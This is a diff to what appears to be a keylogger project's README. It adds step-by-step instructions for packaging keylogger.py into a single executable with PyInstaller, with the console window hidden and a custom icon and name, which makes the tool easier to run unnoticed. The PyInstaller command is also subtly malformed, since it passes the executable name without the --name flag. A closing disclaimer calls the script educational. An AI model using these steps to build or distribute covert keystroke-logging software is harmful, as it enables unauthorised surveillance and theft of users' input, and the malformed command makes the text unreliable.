@@ -340,5 +340,47 @@ mouse_listener_thread = Thread(target=start_mouse_listener)
 mouse_listener_thread.start()
 
 ```
+## Creating an Executable File
+
+To convert this Python script into an executable file, follow these steps:
+
+### 1. **Install PyInstaller**
+
+PyInstaller is a popular tool for creating standalone executables from Python scripts.
+
+```
+pip install pyinstaller
+```
+
+### 2. **Create the Executable**
+
+Use PyInstaller to create an executable file. Run the following command in your terminal or command prompt:
+
+```
+pyinstaller --onefile --noconsole --icon=icon.ico CustomName keylogger.py
+```
+
+- `--onefile`: Packages everything into a single executable file.
+- `--noconsole`: (Optional) Hides the console window (useful for GUI applications).
+- `CustomName`: (Optional) specify the name of the executable file.
+- `--icon`: (Optional) set a custom icon for the executable file.
+
+Replace `CustomName` with your desired executable name.
+
+### 3. **Locate the Executable**
+
+After running the above command, PyInstaller will create a `dist` directory in your project folder. The executable file will be located in this directory.
+
+### 4. **Test the Executable**
+
+Run the executable to ensure that it works as expected. Verify that it performs all the intended functions and handles errors appropriately.
+
+### Important Notes
+
+- **Permissions:** Ensure that you have the necessary permissions to create and execute files on your system.
+- **Dependencies:** PyInstaller bundles most dependencies, but make sure all required libraries are included.
+- **Security:** Be cautious when distributing or using executables, especially those involving sensitive operations.
+
+By following these steps, you can create a standalone executable file for your Python script, making it easier to deploy and run on systems without requiring a Python interpreter.
 
 **Note:** This script is designed for educational purposes and should not be used for unauthorized monitoring or tracking of users. Always ensure compliance with legal and ethical standards before deploying any form of monitoring software.
